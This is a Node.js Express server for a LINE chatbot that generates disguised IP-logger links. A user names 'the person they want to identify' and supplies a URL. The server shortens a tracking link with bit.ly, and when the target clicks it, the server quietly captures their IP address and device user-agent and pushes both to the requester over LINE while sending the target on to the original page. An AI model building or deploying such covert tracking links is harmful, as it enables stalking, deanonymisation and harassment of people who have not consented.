const https = require("https");
const qs = require("querystring");
const request = require("request");
const cors = require("cors");
const express = require("express");
const port = process.env.PORT || 3000;
const TOKEN = process.env.LINE_TOKEN;
const bitly_token = process.env.BITLY_TOKEN;
let random = 400, original = '', push_status = false;

const app = express();

app
  .use(cors())
  .use(express.urlencoded({
    extended: true
  }))
  .use(express.json())
  .post("/webhook", (req, res) => {
    // reply msg
    res.send("HTTP POST request sent to the webhook URL!");
    random = ~~(Math.random() * (999999 - 100000) + 100000);
    const userId = req.body.events[0].source.userId;
    const ms = req.body.events[0].message.text;
    let text = "";
    if (req.body.events[0].type === 'message') {
      if(ms.match(/発行/) || ms.match(/generate/i) || ms.match(/URL/i) || ms.match(/生成/)) {
        text = "下記のサイトで特定したい相手の名前と元のURL、認証コードを入力してください\n※認証コードの有効期限は約30分です。有効期限が切れた場合はもう一度メッセージを送信して下さい。\n\nhttps://rhipsali.github.io/get_ip?userId=" + userId + "\n\n認証コード: " + random;
      } else {
        text = "URLを発行したい場合は「URLを発行したい」「URLを生成して」などと話しかけてみてください";
      };
      const dataString = JSON.stringify({
        replyToken: req.body.events[0].replyToken,
        messages: [{"type": "text", "text": text}]
      });
        
      const headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer " + TOKEN
      };

      const webhookOptions = {
        "hostname": "api.line.me",
        "path": "/v2/bot/message/reply",
        "method": "POST",
        "headers": headers,
        "body": dataString
      };

      const request = https.request(webhookOptions, (res) => {
          res.on("data", (d) => {
            process.stdout.write(d);
          })
        })

      request.on("error", (err) => {
        console.error(err);
      })
    
      request.write(dataString);
      request.end();
    };
  })
  .post("/pass", (req, res) => {
    if (req.body.text === "ぴやっほゃ") {
      res.send(JSON.stringify({pass: random}));
    } else {
      res.sendStatus(415);
    };
  })
  .post("/generated", (req, res) => {
    const name = req.body.name, url = req.body.url, userId = req.query.userId || null;
    const query = {
      name: name,
      original: url,
      id: userId
    };
    const longUrl = "https://get-ip-nero.herokuapp.com/get/ip/nero?" + qs.stringify(query),
    req_url = "https://api-ssl.bitly.com/v3/shorten?" + qs.stringify({
      access_token: bitly_token,
      longUrl: longUrl
    });
    const options = {
      url: req_url,
      method: "GET",
      json: true
    };
    request(options, (err, response, body) => {
      if (err || body.status_code !== 200) {console.log(err); return};
      const generated = body.data.url || longUrl;
      res.send(JSON.stringify({access_url: generated}));
    });
  })
  .get("/get/ip/nero", (req, res) => {
    const nom = req.query.name, id = req.query.id;
    original = req.query.original;
    res.sendFile(__dirname + '/open.html');
    // get ip
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
    str = (ip.match(/[^0-9.]/g)) ? ip.replace(/[^0-9.]/g, "") : ip;
    // push msg
    if ( !id || 
      req.headers["accept-language"] !== "ja" ||
      req.headers["user-agent"] === 'bitlybot/3.0 (+http://bit.ly/)' 
      ) {push_status = false} else {push_status = true};
      console.log(`名前: ${nom}\nIPアドレス: ${str} user-agent: ${req.headers["user-agent"]} push: ${push_status}`); // 一時的
    if(push_status) {
      pushMsg(`${nom}さんがURLにアクセスしました\n\nIPアドレス: ${str}\n\n使用デバイス:\n${req.headers["user-agent"]}`, id);
    };
  })
  .get("/auth", (req, res) => {
    const URL = original || "https://rhipsali.github.io/get_ip";
    res.send(JSON.stringify({url: URL}));
  })
  .listen(port, () => console.log("listening on " + port))
;

function pushMsg(text, id) {
  const msg = JSON.stringify({
    to: id,
    messages: [
      {"type": "text", "text": text}
    ]
  });

  const headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer " + TOKEN
  };
  const webhookOptions = {
    "hostname": "api.line.me",
    "path": "/v2/bot/message/push",
    "method": "POST",
    "headers": headers,
    "body": msg
  };
  const request = https.request(webhookOptions, (res) => {
    res.on("data", (d) => {
      process.stdout.write(d);
    });
  });
  request.on("error", (err) => {
    console.error(err);
  });
  request.write(msg);
  request.end();
};